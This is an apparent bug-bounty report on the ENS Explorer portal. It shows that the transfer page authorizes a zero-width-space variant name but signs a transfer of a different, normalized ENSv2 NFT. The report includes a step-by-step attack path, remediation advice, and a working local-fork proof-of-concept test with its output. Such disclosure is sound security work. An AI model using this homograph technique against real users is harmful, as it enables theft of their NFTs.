# 89960 w a critical raw name ownership check can transfer a different normalized ensv2 token

**Submitted on Aug 22nd 2026 at 03:44:14 UTC by @Tradi3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89960
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user NFTs
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Target

* Program: `Audit Competition | ENS`
* Asset: `apps/portal` (Explorer)
* Audited revision specified by the competition: `63772fd872af472ced58b009499355f3430c2a86`
* Competition-fork import of that revision: `cda79ac`

## Summary

The transfer route authorizes the connected wallet against the raw name from the URL, but the transfer hook silently normalizes that name before looking up the ERC-1155 token ID. ENSv2 can contain two distinct on-chain labels where one normalizes to the other. In that case, the page is opened and authorized for name B while the signed `safeTransferFrom` moves name A.

For example, these are distinct ENSv2 names and token IDs:

* A: `prized-<suffix>.eth`
* B: `prized\u200b-<suffix>.eth` (B contains U+200B ZERO WIDTH SPACE)

`ens_normalize(B)` is A, but the ENSv2 registry hashes and owns the raw labels separately. A user who uses the normal transfer page for B therefore transfers A to the chosen recipient while B remains in the user's wallet.

This matches the competition's Critical impact for displaying or preparing an incorrect name/transaction detail and causing a user to submit a transaction for an unintended asset. If the recipient is attacker-controlled, the result is direct theft of the user's ENS NFT.

## Root cause

The route keeps the raw name from the URL:

* `apps/portal/src/routes/$name/ownership/transfer.tsx:22` reads `name` from the route.
* `transfer.tsx:27` resolves ownership with `getEnsOwnerQueryOptions({ name })`.
* `transfer.tsx:104-109` checks that the connected wallet owns that raw name and then passes the same displayed string into `AuthorizedTransfer`.

`resolveEnsOwner` preserves that raw string. `apps/portal/src/utils/ens/resolveEnsOwner.ts:49-50` passes it directly to ENSjs `getOwnerV2` and `getNameRegistries`.

The state-changing side uses a different identity:

* `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:59` calls `getLabel(name)` before checking the transfer role.
* `apps/portal/src/features/transfer/hooks/useTransferName.ts:112-115` calls `getEnsTokenId({ label: getLabel(name), registryAddress })`.
* `apps/portal/src/utils/token/getLabel.ts:11-19` runs `ens_normalize(name)` before returning the first label.
* `apps/portal/src/features/transfer/helpers/transferToken.ts:69-70` inserts that token ID into `safeTransferFrom`.
* `transferToken.ts:88` still describes the transaction as `Transfer ${name}`, using the raw displayed B string.

The ownership check and transaction description therefore refer to B, while the role check and token ID refer to A.

## Attack path

1. The victim owns a valuable normalized ENSv2 name A and has its normal transfer permission.
2. A distinct raw ENSv2 name B exists whose label normalizes to A. The attacker can transfer B to the victim without the victim taking any action.
3. The victim opens B's ordinary Explorer transfer page. B is rendered with the zero-width character invisible, and the raw owner query correctly reports the victim as B's owner.
4. The transfer-role query silently checks A, so the form is enabled using A's permission.
5. The victim enters a recipient and starts the transfer for B.
6. `useTransferName` silently derives A's token ID and the wallet signs `safeTransferFrom(victim, recipient, tokenId(A), 1, 0x)`.
7. A moves to the recipient. B remains owned by the victim.

No browser bug, local-state modification, privileged role, third-party system, or contract modification is required. The victim is using the intended transfer workflow with an already-connected wallet.

## Why the PoC demonstrates the in-scope impact

* The test does not mock either owner lookup. It registers two separate raw ENSv2 labels through the repository's fixture and resolves both through the production `resolveEnsOwner` code.
* It does not manually grant a role or call `safeTransferFrom` outside the app path. The state change is submitted by the production `transferToken` helper through the production transaction manager.
* The vulnerable decision is entirely in the listed `apps/portal` asset: the Portal checks ownership for B, derives A's token ID, and describes the transaction as a transfer of B. The ENSv2 contracts only execute the incorrect calldata produced by the in-scope app; no contract defect is assumed.
* There is no stale cache, separate-device race, subgraph timing, or previously trusted delegate. Once the two raw labels exist, the result is deterministic.
* The harm is immediate and not merely a retained permission or recoverable display state: the successful transaction changes owner(A) to the recipient while owner(B) remains the victim. The victim no longer owns A and cannot reset it through another transaction.
* The user action is the ordinary Explorer transfer workflow expressly covered by the competition's connected-wallet and incorrect-transaction-detail impacts.

## Relationship to EXP-INPUT-005

EXP-INPUT-005 discloses that validators accept names that ENS normalization transforms and describes the practical impact as homograph-style display confusion. This report demonstrates a materially different consequence expressly allowed by the Known Issues preamble: inconsistent raw/normalized identity is used to replace the ERC-1155 token ID in a state-changing transfer. The result is not display confusion; it is transfer of a different NFT and raises the impact to Critical.

The previously reported renewal mismatch is a separate implementation in the Manager app: its display path normalizes a label while its renewal calldata preserves the raw label. This report is in the Explorer transfer path and has the opposite state-changing mismatch: ownership is checked for the raw label while the calldata token ID is normalized to a different existing NFT. It uses different files, a different transaction builder, and causes transfer of principal rather than payment of another name's renewal fee. Even if both are grouped under unsafe normalization, this is the materially higher direct-NFT-loss consequence that the Known Issues preamble expressly treats as new.

## Remediation

Use one name identity throughout authorization, display, permission checks, and calldata construction.

The safest short-term change is to block state-changing flows when the route label is not byte-for-byte normalized. If unnormalized ENSv2 labels must remain manageable, preserve the raw label for every registry lookup and write instead of normalizing inside `getLabel`.

Before opening the transaction modal, assert that:

* the owner lookup,
* the permission lookup,
* the token ID used in calldata, and
* the name shown to the user

all refer to the same raw label hash. Display escaped Unicode and the exact token identifier in the confirmation UI for any non-normalized name.

Add a regression test with A and `A + U+200B` proving that attempting to transfer B can never encode A's token ID.

## Proof of Concept

## Proof of concept

The full source of `poc-normalized-route-transfers-different-name.test.ts` is included directly in the report's Proof of Concept field so the test is reproducible without access to the reporter's computer.

The test uses the repository's own ENSv2 fixture and production helpers. It:

1. Registers A and B as separate ENSv2 names to the same victim on the provided Anvil Sepolia fork.
2. Proves that the raw labels and registry token IDs differ.
3. Resolves both names through the production `resolveEnsOwner` path and confirms that the victim owns both.
4. Applies the production transfer hook's `getLabel(B)` token lookup.
5. Submits the transfer through the production `transferToken` and transaction-manager code.
6. Resolves both names again and asserts that A moved to the attacker while B stayed with the victim.

Run from the repository root after installing dependencies:

```bash
docker compose -f e2e/infra/docker-compose.yml up -d anvil
pnpm --filter portal exec vitest run src/features/transfer/poc-normalized-route-transfers-different-name.test.ts --testTimeout=180000 --reporter=verbose
```

The test uses only the standard public Anvil development keys. It does not contact or modify a live ENS deployment.

Observed output on the audited revision:

```
PoC evidence:
  route name B: prized\u200b-1787368473.eth
  normalized name A: prized-1787368473.eth
  tokenId(B): 47638493657519059622004913303162969284478097140031014115983699672701083844608
  tokenId(A): 102237250837543746986106707024132384739069986093677436524674940352335869640704
  transaction: 0xac062b8e9529865a9b5a5a267986e255fda88b5b8e4de7e34d56d5854b6bc5c3
  owner(A) after: 0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF
  owner(B) after: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

Test Files  1 passed (1)
Tests       1 passed (1)
```

The Node test prints an expected IndexedDB-unavailable warning before falling back to the transaction manager's non-IndexedDB persistence path. The transaction reaches `submitting`, `pending`, and `success` and the ownership assertions pass.

### Complete test source

```typescript
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getTokenId } from '@ensdomains/ensjs/public/v2'
import { createPublicClient, createWalletClient, http, labelhash } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { describe, expect, it, vi } from 'vitest'
import { resolveEnsOwner } from '@/utils/ens/resolveEnsOwner'
import { getLabel } from '@/utils/token/getLabel'
import { createMakeV2Name } from '../../../../../e2e/fixtures/makeV2Name'
import { testClient } from '../../../../../e2e/helpers/anvil-client'
import { createEOASigner } from '../registry/utils/signer.helpers'
import { transferToken } from './helpers/transferToken'

const ANVIL_RPC_URL = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const localSepolia = extendChainWithEns({
  ...sepolia,
  rpcUrls: {
    default: { http: [ANVIL_RPC_URL] },
    public: { http: [ANVIL_RPC_URL] },
  },
})
const transport = http(ANVIL_RPC_URL)
const publicClient = createPublicClient({ chain: localSepolia, transport })

const VICTIM_KEY =
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
const ATTACKER_KEY =
  '0x0000000000000000000000000000000000000000000000000000000000000002'
const victim = privateKeyToAccount(VICTIM_KEY)
const attacker = privateKeyToAccount(ATTACKER_KEY)

describe('PoC: raw route name authorizes B but transfer calldata moves A', () => {
  it('transfers the normalized name while leaving the raw deceptive name untouched', async () => {
    // Account 0 is intentionally used because Anvil exposes it as an unlocked
    // JSON-RPC signer, matching how the production EOA transport delegates
    // signing to an injected wallet.
    const fixedNow = Date.now()
    vi.spyOn(Date, 'now').mockReturnValue(fixedNow)

    const baseLabel = 'prized'
    const deceptiveLabel = `${baseLabel}\u200b`
    const makeV2Name = createMakeV2Name({ userAccount: victim })

    const normalizedName = await makeV2Name({ label: baseLabel })
    const deceptiveName = await makeV2Name({ label: deceptiveLabel })

    expect(getLabel(deceptiveName)).toBe(normalizedName.slice(0, -4))
    expect(labelhash(deceptiveName.slice(0, -4))).not.toBe(
      labelhash(getLabel(deceptiveName)),
    )

    const deceptiveOwnerBefore = await resolveEnsOwner(
      publicClient,
      deceptiveName,
    )
    const normalizedOwnerBefore = await resolveEnsOwner(
      publicClient,
      normalizedName,
    )

    expect(deceptiveOwnerBefore?.owner).toBe(victim.address)
    expect(normalizedOwnerBefore?.owner).toBe(victim.address)
    expect(deceptiveOwnerBefore?.registryAddress).toBe(
      normalizedOwnerBefore?.registryAddress,
    )

    const registryAddress = deceptiveOwnerBefore?.registryAddress
    if (!registryAddress) throw new Error('Raw name registry was not resolved')

    const rawTokenId = await getTokenId(publicClient, {
      label: deceptiveName.slice(0, -4),
      registryAddress,
    })
    const normalizedTokenId = await getTokenId(publicClient, {
      label: getLabel(deceptiveName),
      registryAddress,
    })

    expect(rawTokenId).not.toBe(normalizedTokenId)

    await testClient.setCode({ address: attacker.address, bytecode: '0x' })
    const walletClient = createWalletClient({
      account: victim,
      chain: localSepolia,
      transport,
    })

    const transferResult = await transferToken({
      name: deceptiveName,
      registryAddress,
      tokenId: normalizedTokenId,
      recipient: attacker.address,
      walletClient,
      publicClient,
      signer: createEOASigner(walletClient),
      chainId: localSepolia.id,
      id: 'poc-cross-name-transfer',
    })

    const normalizedOwnerAfter = await resolveEnsOwner(
      publicClient,
      normalizedName,
    )
    const deceptiveOwnerAfter = await resolveEnsOwner(
      publicClient,
      deceptiveName,
    )

    expect(normalizedOwnerAfter?.owner).toBe(attacker.address)
    expect(deceptiveOwnerAfter?.owner).toBe(victim.address)

    console.log('PoC evidence:')
    console.log(`  route name B: ${deceptiveName.replace('\u200b', '\\u200b')}`)
    console.log(`  normalized name A: ${normalizedName}`)
    console.log(`  tokenId(B): ${rawTokenId}`)
    console.log(`  tokenId(A): ${normalizedTokenId}`)
    console.log(`  transaction: ${transferResult.hash}`)
    console.log(`  owner(A) after: ${normalizedOwnerAfter?.owner}`)
    console.log(`  owner(B) after: ${deceptiveOwnerAfter?.owner}`)

    vi.restoreAllMocks()
  }, 180_000)
})
```
